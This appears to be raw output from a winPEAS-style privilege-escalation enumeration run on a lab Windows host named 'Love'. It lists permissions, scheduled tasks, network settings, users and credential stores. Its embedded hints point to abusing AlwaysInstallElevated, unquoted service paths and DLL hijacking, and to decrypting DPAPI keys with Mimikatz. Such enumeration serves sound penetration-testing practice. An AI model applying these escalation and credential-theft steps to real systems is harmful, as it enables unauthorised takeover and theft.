C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ NT SERVICE\TrustedInstaller:(F)

C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2020.20120.4004.0_x64__8wekyb3d8bbwe\ BUILTIN\Users:(OI)(CI)(Rc,S,RD,REA,X,RA)


 [+] RUN AT STARTUP
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
 
C:\Documents and Settings\Phoebe\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             LOVE\Phoebe:(I)(OI)(CI)(F)
 
C:\Documents and Settings\Phoebe\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(I)(F)
                                                                         LOVE\Phoebe:(I)(F)
C:\Documents and Settings\Phoebe\Start Menu\Programs\Startup\xampp-control - Shortcut.lnk NT AUTHORITY\SYSTEM:(I)(F)
                                                                                          LOVE\Phoebe:(I)(F)
 
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)
 
C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                                              LOVE\Phoebe:(I)(OI)(CI)(F)
 
C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(I)(F)
                                                                                          LOVE\Phoebe:(I)(F)
C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xampp-control - Shortcut.lnk NT AUTHORITY\SYSTEM:(I)(F)
                                                                                                           LOVE\Phoebe:(I)(F)
 

Folder: \
OneDrive Standalone Update Task-S-1-5-21 6/14/2021 3:22:15 PM   Ready          

Folder: \Microsoft
Cleanup                                  N/A                    Ready          
Kill Msiexec                             N/A                    Ready          
Kill On-Access                           N/A                    Ready          
Remove Defender Definitions              N/A                    Ready          

Folder: \Microsoft\OneCore
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\.NET Framework
.NET Framework NGEN v4.0.30319           N/A                    Ready          
.NET Framework NGEN v4.0.30319 64        N/A                    Ready          

Folder: \Microsoft\Windows\Active Directory Rights Management Services Client
AD RMS Rights Policy Template Management N/A                    Ready          

Folder: \Microsoft\Windows\AppID
PolicyConverter                          N/A                    Ready          
SmartScreenSpecific                      N/A                    Ready          
VerifiedPublisherCertStoreCheck          N/A                    Ready          

Folder: \Microsoft\Windows\Application Experience
Microsoft Compatibility Appraiser        6/15/2021 4:38:55 AM   Ready          
PcaPatchDbTask                           6/14/2021 3:55:30 PM   Ready          
ProgramDataUpdater                       N/A                    Ready          
StartupAppTask                           N/A                    Ready          

Folder: \Microsoft\Windows\ApplicationData
appuriverifierdaily                      N/A                    Ready          
appuriverifierinstall                    N/A                    Ready          
CleanupTemporaryState                    N/A                    Ready          
DsSvcCleanup                             N/A                    Ready          

Folder: \Microsoft\Windows\AppxDeploymentClient

Folder: \Microsoft\Windows\Autochk
Proxy                                    N/A                    Ready          

Folder: \Microsoft\Windows\BitLocker
BitLocker Encrypt All Drives             N/A                    Ready          
BitLocker MDM policy Refresh             N/A                    Ready          

Folder: \Microsoft\Windows\Bluetooth
UninstallDeviceTask                      N/A                    Ready          

Folder: \Microsoft\Windows\BrokerInfrastructure
BgTaskRegistrationMaintenanceTask        N/A                    Ready          

Folder: \Microsoft\Windows\CertificateServicesClient
UserTask                                 N/A                    Ready          
UserTask-Roam                            N/A                    Ready          

Folder: \Microsoft\Windows\Chkdsk
ProactiveScan                            N/A                    Ready          
SyspartRepair                            N/A                    Ready          

Folder: \Microsoft\Windows\CloudExperienceHost
CreateObjectTask                         N/A                    Ready          

Folder: \Microsoft\Windows\CUAssistant
CULauncher                               6/14/2021 6:30:11 PM   Ready          

Folder: \Microsoft\Windows\Customer Experience Improvement Program
Consolidator                             6/14/2021 6:00:00 PM   Ready          
Uploader                                 N/A                    Ready          
UsbCeip                                  N/A                    Ready          

Folder: \Microsoft\Windows\Data Integrity Scan
Data Integrity Check And Scan            6/14/2021 11:38:18 PM  Ready          
Data Integrity Scan                      N/A                    Ready          
Data Integrity Scan for Crash Recovery   N/A                    Ready          

Folder: \Microsoft\Windows\Defrag
ScheduledDefrag                          N/A                    Ready          

Folder: \Microsoft\Windows\Device Information
Device                                   6/15/2021 3:20:54 AM   Ready          
Device User                              N/A                    Ready          

Folder: \Microsoft\Windows\Diagnosis
RecommendedTroubleshootingScanner        N/A                    Ready          
Scheduled                                N/A                    Ready          

Folder: \Microsoft\Windows\DirectX
DirectXDatabaseUpdater                   N/A                    Ready          
DXGIAdapterCache                         N/A                    Ready          

Folder: \Microsoft\Windows\DiskCleanup
SilentCleanup                            N/A                    Ready          

Folder: \Microsoft\Windows\DiskDiagnostic
Microsoft-Windows-DiskDiagnosticDataColl N/A                    Ready          

Folder: \Microsoft\Windows\DiskFootprint
Diagnostics                              N/A                    Ready          
StorageSense                             N/A                    Ready          

Folder: \Microsoft\Windows\DUSM
dusmtask                                 N/A                    Ready          

Folder: \Microsoft\Windows\EDP
EDP App Launch Task                      N/A                    Ready          
EDP Auth Task                            N/A                    Ready          
EDP Inaccessible Credentials Task        N/A                    Ready          
StorageCardEncryption Task               N/A                    Ready          

Folder: \Microsoft\Windows\ExploitGuard
ExploitGuard MDM policy Refresh          N/A                    Ready          

Folder: \Microsoft\Windows\Feedback
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Feedback\Siuf
DmClient                                 N/A                    Ready          
DmClientOnScenarioDownload               N/A                    Ready          

Folder: \Microsoft\Windows\File Classification Infrastructure

Folder: \Microsoft\Windows\FileHistory
File History (maintenance mode)          N/A                    Ready          

Folder: \Microsoft\Windows\Flighting
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Flighting\FeatureConfig
ReconcileFeatures                        N/A                    Ready          
UsageDataFlushing                        N/A                    Ready          
UsageDataReporting                       N/A                    Ready          

Folder: \Microsoft\Windows\Flighting\OneSettings
RefreshCache                             6/14/2021 4:12:28 PM   Ready          

Folder: \Microsoft\Windows\Input
LocalUserSyncDataAvailable               N/A                    Ready          
MouseSyncDataAvailable                   N/A                    Ready          
PenSyncDataAvailable                     N/A                    Ready          
TouchpadSyncDataAvailable                N/A                    Ready          

Folder: \Microsoft\Windows\InstallService
ScanForUpdates                           6/15/2021 7:01:42 AM   Ready          
ScanForUpdatesAsUser                     N/A                    Ready          

Folder: \Microsoft\Windows\International
Synchronize Language Settings            N/A                    Ready          

Folder: \Microsoft\Windows\LanguageComponentsInstaller
Installation                             N/A                    Ready          
ReconcileLanguageResources               N/A                    Ready          

Folder: \Microsoft\Windows\Live
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Location
Notifications                            N/A                    Ready          
WindowsActionDialog                      N/A                    Ready          

Folder: \Microsoft\Windows\Maintenance
WinSAT                                   N/A                    Ready          

Folder: \Microsoft\Windows\Management
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Management\Provisioning
Cellular                                 N/A                    Ready          
Logon                                    N/A                    Ready          

Folder: \Microsoft\Windows\Maps
MapsToastTask                            N/A                    Ready          

Folder: \Microsoft\Windows\MemoryDiagnostic
ProcessMemoryDiagnosticEvents            N/A                    Ready          
RunFullMemoryDiagnostic                  N/A                    Ready          

Folder: \Microsoft\Windows\Mobile Broadband Accounts
MNO Metadata Parser                      N/A                    Ready          

Folder: \Microsoft\Windows\MUI
LPRemove                                 N/A                    Ready          

Folder: \Microsoft\Windows\Multimedia
SystemSoundsService                      N/A                    Running        

Folder: \Microsoft\Windows\NetCfg
BindingWorkItemQueueHandler              N/A                    Ready          

Folder: \Microsoft\Windows\NetTrace
GatherNetworkInfo                        N/A                    Ready          

Folder: \Microsoft\Windows\NlaSvc
WiFiTask                                 N/A                    Ready          

Folder: \Microsoft\Windows\Offline Files

Folder: \Microsoft\Windows\PLA
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\Plug and Play
Device Install Group Policy              N/A                    Ready          
Device Install Reboot Required           N/A                    Ready          
Plug and Play Cleanup                    N/A                    Ready          
Sysprep Generalize Drivers               N/A                    Ready          

Folder: \Microsoft\Windows\Power Efficiency Diagnostics
AnalyzeSystem                            N/A                    Ready          

Folder: \Microsoft\Windows\Printing
EduPrintProv                             N/A                    Ready          

Folder: \Microsoft\Windows\RecoveryEnvironment
VerifyWinRE                              N/A                    Ready          

Folder: \Microsoft\Windows\Registry
RegIdleBackup                            N/A                    Ready          

Folder: \Microsoft\Windows\Servicing
StartComponentCleanup                    N/A                    Ready          

Folder: \Microsoft\Windows\SettingSync
BackgroundUploadTask                     N/A                    Ready          
NetworkStateChangeTask                   N/A                    Ready          

Folder: \Microsoft\Windows\SharedPC

Folder: \Microsoft\Windows\Shell
CreateObjectTask                         N/A                    Ready          
FamilySafetyMonitor                      N/A                    Ready          
FamilySafetyRefreshTask                  N/A                    Ready          
IndexerAutomaticMaintenance              N/A                    Ready          

Folder: \Microsoft\Windows\SMB
UninstallSMB1ClientTask                  N/A                    Ready          
UninstallSMB1ServerTask                  N/A                    Ready          

Folder: \Microsoft\Windows\SoftwareProtectionPlatform

Folder: \Microsoft\Windows\SpacePort
SpaceAgentTask                           N/A                    Ready          
SpaceManagerTask                         N/A                    Ready          

Folder: \Microsoft\Windows\StateRepository
MaintenanceTasks                         N/A                    Ready          

Folder: \Microsoft\Windows\Storage Tiers Management
Storage Tiers Management Initialization  N/A                    Ready          

Folder: \Microsoft\Windows\Subscription
EnableLicenseAcquisition                 N/A                    Ready          

Folder: \Microsoft\Windows\Sysmain
ResPriStaticDbSync                       N/A                    Ready          
WsSwapAssessmentTask                     N/A                    Ready          

Folder: \Microsoft\Windows\SystemRestore
SR                                       N/A                    Ready          

Folder: \Microsoft\Windows\Task Manager
Interactive                              N/A                    Ready          

Folder: \Microsoft\Windows\termsrv
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\termsrv\RemoteFX
RemoteFXWarningTask                      6/23/2021 1:00:00 PM   Ready          

Folder: \Microsoft\Windows\TextServicesFramework
MsCtfMonitor                             N/A                    Ready          

Folder: \Microsoft\Windows\Time Synchronization
ForceSynchronizeTime                     N/A                    Ready          
SynchronizeTime                          N/A                    Ready          

Folder: \Microsoft\Windows\Time Zone
SynchronizeTimeZone                      N/A                    Ready          

Folder: \Microsoft\Windows\UNP

Folder: \Microsoft\Windows\UPnP
UPnPHostConfig                           N/A                    Ready          

Folder: \Microsoft\Windows\USB
Usb-Notifications                        N/A                    Ready          

Folder: \Microsoft\Windows\WCM
WiFiTask                                 N/A                    Ready          

Folder: \Microsoft\Windows\WDI
ResolutionHost                           N/A                    Running        

Folder: \Microsoft\Windows\Windows Error Reporting
QueueReporting                           6/14/2021 1:16:07 PM   Ready          

Folder: \Microsoft\Windows\Windows Filtering Platform
BfeOnServiceStartTypeChange              N/A                    Ready          

Folder: \Microsoft\Windows\Windows Media Sharing
UpdateLibrary                            N/A                    Ready          

Folder: \Microsoft\Windows\WindowsColorSystem
Calibration Loader                       N/A                    Ready          

Folder: \Microsoft\Windows\WindowsUpdate
Scheduled Start                          N/A                    Ready          
sih                                      6/15/2021 5:43:43 AM   Ready          

Folder: \Microsoft\Windows\Wininet
CacheTask                                N/A                    Running        

Folder: \Microsoft\Windows\WlanSvc
CDSSync                                  N/A                    Ready          

Folder: \Microsoft\Windows\Work Folders
Work Folders Logon Synchronization       N/A                    Ready          
Work Folders Maintenance Work            N/A                    Ready          

Folder: \Microsoft\Windows\Workplace Join

Folder: \Microsoft\Windows\WwanSvc
NotificationTask                         N/A                    Ready          
OobeDiscovery                            N/A                    Ready          

Folder: \Microsoft\XblGameSave
XblGameSaveTask                          N/A                    Ready          

 [+] AlwaysInstallElevated?
   [i] If '1' then you can install a .msi file with admin privileges ;)
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


[*] NETWORK
 [+] CURRENT SHARES

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
IPC$                                         Remote IPC                        
ADMIN$       C:\WINDOWS                      Remote Admin                      
The command completed successfully.


 [+] INTERFACES

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Love
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-AB-4D
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.239(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

 [+] USED PORTS
   [i] Check for services restricted from the outside
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6604
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6604
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       6612
  TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       6604
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4988
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       3980
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1216
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1460
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2224
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2628
  TCP    10.10.10.239:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       6604
  TCP    [::]:135               [::]:0                 LISTENING       896
  TCP    [::]:443               [::]:0                 LISTENING       6604
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       6612
  TCP    [::]:5000              [::]:0                 LISTENING       6604
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:5986              [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       3980
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       664
  TCP    [::]:49665             [::]:0                 LISTENING       516
  TCP    [::]:49666             [::]:0                 LISTENING       1216
  TCP    [::]:49667             [::]:0                 LISTENING       1460
  TCP    [::]:49668             [::]:0                 LISTENING       2224
  TCP    [::]:49669             [::]:0                 LISTENING       652
  TCP    [::]:49670             [::]:0                 LISTENING       2628

 [+] FIREWALL

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Disable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Defender Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
5986   TCP       Any      (null)

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at https://go.microsoft.com/fwlink/?linkid=121488 .



Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
5986   TCP       Enable  Inbound               Allow WinRM HTTPS

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Disable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------
Enable   Inbound              Apache HTTP Server / C:\xampp\apache\bin\httpd.exe

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------
5986   TCP       Enable  Inbound               Allow WinRM HTTPS

Log configuration:
-------------------------------------------------------------------
File location   = C:\WINDOWS\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at https://go.microsoft.com/fwlink/?linkid=121488 .



 [+] ARP

Interface: 10.10.10.239 --- 0x6
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-33-6f     dynamic   
  10.10.10.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    

 [+] ROUTES
===========================================================================
Interface List
  6...00 50 56 b9 ab 4d ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2     10.10.10.239    271
       10.10.10.0    255.255.255.0         On-link      10.10.10.239    271
     10.10.10.239  255.255.255.255         On-link      10.10.10.239    271
     10.10.10.255  255.255.255.255         On-link      10.10.10.239    271
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      10.10.10.239    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      10.10.10.239    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

 [+] Hosts file

 [+] DNS CACHE

 [+] WIFI
[*] BASIC USER INFO
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups

 [+] CURRENT USER
User name                    Phoebe
Full Name                    Phoebe
Comment                      Workstation Power User
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/12/2021 12:54:30 PM
Password expires             Never
Password changeable          4/12/2021 12:54:30 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/14/2021 11:35:26 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

The request will be processed at a domain controller for domain WORKGROUP.


USER INFORMATION
----------------

User Name   SID                                          
=========== =============================================
love\phoebe S-1-5-21-2955427858-187959437-2037071653-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled


 [+] USERS

User accounts for \\LOVE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
Phoebe                   WDAGUtilityAccount       
The command completed successfully.


 [+] GROUPS

Aliases for \\LOVE

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.


 [+] ADMINISTRATORS GROUPS
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

 
 [+] CURRENT LOGGED USERS
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>phoebe                console             1  Active      none   6/14/2021 11:35 AM
 
 [+] Kerberos Tickets

Current LogonId is 0:0x395fc

Cached Tickets: (0)
 
 [+] CURRENT CLIPBOARD
   [i] Any password inside the clipboard?

[*] SERVICE VULNERABILITIES

 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe NT AUTHORITY\SYSTEM:(I)(F)

C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe NT AUTHORITY\SYSTEM:(I)(F)

C:\Program Files (x86)\Microsoft\Edge\Application\90.0.818.46\elevation_service.exe S-1-15-3-1024-3635283841-2530182609-996808640-1887759898-3848208603-3313616867-983405619-2501854204:(I)(RX)

C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)

C:\WINDOWS\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe NT SERVICE\TrustedInstaller:(F)

C:\WINDOWS\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)

C:\Program Files\Microsoft Update Health Tools\uhssvc.exe NT AUTHORITY\SYSTEM:(I)(F)

C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(I)(F)

C:\Program Files\VMware\VMware Tools\vmtoolsd.exe BUILTIN\Administrators:(I)(F)

C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2103.7-0\NisSrv.exe APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2103.7-0\MsMpEng.exe APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Windows Media Player\wmpnetwk.exe NT SERVICE\TrustedInstaller:(F)


 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

 [+] UNQUOTED SERVICE PATHS
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe'
   [i] The permissions are also checked and filtered using icacls
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

tTcpPortSharing 
 C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe 
C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)

PerfHost 
 C:\WINDOWS\SysWow64\perfhost.exe 
C:\WINDOWS\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)

TrustedInstaller 
 C:\WINDOWS\servicing\TrustedInstaller.exe 
C:\WINDOWS\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)


[*] DLL HIJACKING in PATHenv variable
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
C:\WINDOWS\system32 NT SERVICE\TrustedInstaller:(F)
 
C:\WINDOWS NT SERVICE\TrustedInstaller:(F)
 
C:\WINDOWS\System32\Wbem NT SERVICE\TrustedInstaller:(F)
 
C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                                    LOVE\Phoebe:(OI)(CI)(F)
 

[*] CREDENTIALS

 [+] WINDOWS VAULT
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02kkhalqkqihdokm
    Local machine persistence
    

 [+] DPAPI MASTER KEYS
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi


    Directory: C:\Users\Phoebe\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-         4/12/2021   3:50 PM                S-1-5-21-2955427858-187959437-2037071653-1002                        


 [+] DPAPI MASTER KEYS
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi

Looking inside C:\Users\Phoebe\AppData\Roaming\Microsoft\Credentials\


Looking inside C:\Users\Phoebe\AppData\Local\Microsoft\Credentials\

DFBE70A7E5CC19A398EBF1B96859CE5D

 [+] Unattended files

 [+] SAM and SYSTEM backups

 [+] McAffee SiteList.xml
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 [+] GPP Password
^[[A^[[A^[[A
 [+] Cloud Credentials

 [+] AppCmd
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe

 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    LastUsedUsername    REG_SZ    phoebe
    DefaultUserName    REG_SZ    phoebe
    DefaultDomainName    REG_SZ    LOVE
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
Looking inside HKCU\Software\TightVNC\Server
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
Looking inside HKCU\Software\OpenSSH\Agent\Keys
C:\Users\Phoebe\AppData\Local\Microsoft\Edge\User Data\Default\History
C:\Users\Phoebe\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
C:\Users\Phoebe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
C:\Users\Phoebe\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
